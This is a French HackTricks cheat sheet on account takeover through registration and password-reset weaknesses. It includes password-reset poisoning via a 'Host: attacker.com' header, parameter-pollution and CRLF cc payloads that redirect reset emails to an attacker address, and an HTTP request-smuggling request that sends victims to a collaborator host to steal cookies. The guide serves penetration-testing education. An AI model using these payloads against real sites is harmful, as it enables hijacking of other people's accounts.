# Vuln√©rabilit√©s d'Enregistrement & de Prise de Contr√¥le

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Prise de Contr√¥le d'Enregistrement

### Enregistrement en Double

* Essayez de vous enregistrer en utilisant un nom d'utilisateur existant
* V√©rifiez en variant l'email :
  * majuscules
  * \+1@
  * ajoutez des espaces dans l'email
  * caract√®res sp√©ciaux dans le nom de l'email (%00, %09, %20)
  * Mettez des caract√®res noirs apr√®s l'email : `test@test.com a`
  * victim@gmail.com@attacker.com
  * victim@attacker.com@gmail.com

### √ânum√©ration de Noms d'Utilisateur

V√©rifiez si vous pouvez d√©terminer quand un nom d'utilisateur a d√©j√† √©t√© enregistr√© dans l'application.

### Politique de Mot de Passe

Lors de la cr√©ation d'un utilisateur, v√©rifiez la politique de mot de passe (v√©rifiez si vous pouvez utiliser des mots de passe faibles).\
Dans ce cas, vous pourriez essayer de forcer brutalement les identifiants.

### Injection SQL

[**Consultez cette page**](sql-injection/#insert-statement) pour apprendre comment tenter des prises de contr√¥le de compte ou extraire des informations via des **Injections SQL** dans les formulaires d'enregistrement.

### Prises de Contr√¥le Oauth

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### Vuln√©rabilit√©s SAML

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### Changement d'Email

Lorsque vous √™tes enregistr√©, essayez de changer l'email et v√©rifiez si ce changement est correctement valid√© ou si vous pouvez le changer pour des emails arbitraires.

### Autres V√©rifications

* V√©rifiez si vous pouvez utiliser des **emails jetables**
* Un **mot de passe long** (>200) peut entra√Æner un **DoS**
* **V√©rifiez les limites de taux de cr√©ation de compte**
* Utilisez username@**burp\_collab**.net et analysez le **callback**

## **Prise de Contr√¥le de R√©initialisation de Mot de Passe**

### Fuite de Token de R√©initialisation de Mot de Passe Via le R√©f√©rent <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Demandez la r√©initialisation du mot de passe √† votre adresse email
2. Cliquez sur le lien de r√©initialisation du mot de passe
3. Ne changez pas le mot de passe
4. Cliquez sur des sites tiers (par exemple : Facebook, Twitter)
5. Interceptez la requ√™te dans le proxy Burp Suite
6. V√©rifiez si l'en-t√™te du r√©f√©rent divulgue le token de r√©initialisation du mot de passe.

### Empoisonnement de R√©initialisation de Mot de Passe <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Interceptez la requ√™te de r√©initialisation du mot de passe dans Burp Suite
2. Ajoutez ou modifiez les en-t√™tes suivants dans Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Transmettez la requ√™te avec l'en-t√™te modifi√©\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Recherchez une URL de r√©initialisation de mot de passe bas√©e sur l'_en-t√™te host_ comme : `https://attacker.com/reset-password.php?token=TOKEN`

### R√©initialisation de Mot de Passe Via le Param√®tre Email <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR sur les param√®tres de l'API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. L'attaquant doit se connecter avec son compte et acc√©der √† la fonctionnalit√© **Changer de mot de passe**.
2. D√©marrer Burp Suite et intercepter la requ√™te.
3. L'envoyer √† l'onglet r√©p√©teur et modifier les param√®tres : ID utilisateur/email\
`powershell POST /api/changepass [...] ("form": {"email":"victime@email.com","password":"motdepassefiable"})`

### Jeton de r√©initialisation de mot de passe faible <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Le jeton de r√©initialisation de mot de passe doit √™tre g√©n√©r√© al√©atoirement et √™tre unique √† chaque fois.\
Essayez de d√©terminer si le jeton expire ou s'il est toujours le m√™me, dans certains cas l'algorithme de g√©n√©ration est faible et peut √™tre devin√©. Les variables suivantes pourraient √™tre utilis√©es par l'algorithme.

* Horodatage
* UserID
* Email de l'utilisateur
* Pr√©nom et Nom
* Date de naissance
* Cryptographie
* Num√©rique uniquement
* Petite s√©quence de jetons (caract√®res entre \[A-Z,a-z,0-9])
* R√©utilisation du jeton
* Date d'expiration du jeton

### Fuite du jeton de r√©initialisation de mot de passe <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. D√©clenchez une demande de r√©initialisation de mot de passe en utilisant l'API/UI pour un email sp√©cifique, par exemple : test@mail.com
2. Inspectez la r√©ponse du serveur et v√©rifiez la pr√©sence de `resetToken`
3. Utilisez ensuite le jeton dans une URL comme `https://exemple.com/v3/user/password/reset?resetToken=[LE_JETON_DE_REINITIALISATION]&email=[L_EMAIL]`

### R√©initialisation du mot de passe via collision de noms d'utilisateur <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Inscrivez-vous sur le syst√®me avec un nom d'utilisateur identique √† celui de la victime, mais avec des espaces ins√©r√©s avant et/ou apr√®s le nom d'utilisateur, par exemple : `"admin "`
2. Demandez une r√©initialisation de mot de passe avec votre nom d'utilisateur malveillant.
3. Utilisez le jeton envoy√© √† votre email et r√©initialisez le mot de passe de la victime.
4. Connectez-vous au compte de la victime avec le nouveau mot de passe.

La plateforme CTFd √©tait vuln√©rable √† cette attaque.\
Voir : [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Prise de contr√¥le de compte via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Trouvez un XSS √† l'int√©rieur de l'application ou d'un sous-domaine si les cookies sont limit√©s au domaine parent : `*.domain.com`
2. Fuitez le **cookie de session** actuel
3. Authentifiez-vous en tant qu'utilisateur en utilisant le cookie

### Prise de contr√¥le de compte via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1\. Utilisez **smuggler** pour d√©tecter le type de HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2\. Pr√©parez une requ√™te qui √©crasera le `POST / HTTP/1.1` avec les donn√©es suivantes :\
`GET http://quelquechose.burpcollaborator.net HTTP/1.1 X:` dans le but de rediriger les victimes vers burpcollab et de voler leurs cookies\
3\. La requ√™te finale pourrait ressembler √† ce qui suit
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone signale l'exploitation de ce bogue
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Prise de contr√¥le de compte via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Cr√©ez un payload pour le CSRF, par exemple : "Formulaire HTML avec soumission automatique pour un changement de mot de passe"
2. Envoyez le payload

### Prise de contr√¥le de compte via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

Le JSON Web Token peut √™tre utilis√© pour authentifier un utilisateur.

* Modifiez le JWT avec un autre ID utilisateur / Email
* V√©rifiez la faiblesse de la signature JWT

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## R√©f√©rences

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
